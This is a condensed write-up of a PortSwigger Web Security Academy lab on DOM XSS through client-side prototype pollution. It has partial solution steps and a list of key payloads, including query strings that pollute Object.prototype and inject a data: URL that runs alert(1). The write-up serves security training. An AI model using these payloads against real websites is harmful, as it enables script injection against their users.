## DOM XSS via client-side prototype pollution

**Category:** prototype_pollution
**Difficulty:** Unknown

### Description
This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

### Solution Steps
1. In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string: /?__proto__[foo]=bar
2. Open the browser DevTools panel and go to the Console tab.
3. Enter Object.prototype .
4. Study the properties of the returned object. Observe that it now has a foo property with the value bar . You've successfully found a prototype pollution source.

### Key Payloads
- `Object.prototype`
- `alert()`
- `/?__proto__[foo]=bar`
- `searchLogger.js`
- `config`
- `transport_url`
- `<script>`
- `/?__proto__[transport_url]=foo`
- `data:`
- `/?__proto__[transport_url]=data:,alert(1);`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: prototype_pollution

---
*Source: PortSwigger Web Security Academy*
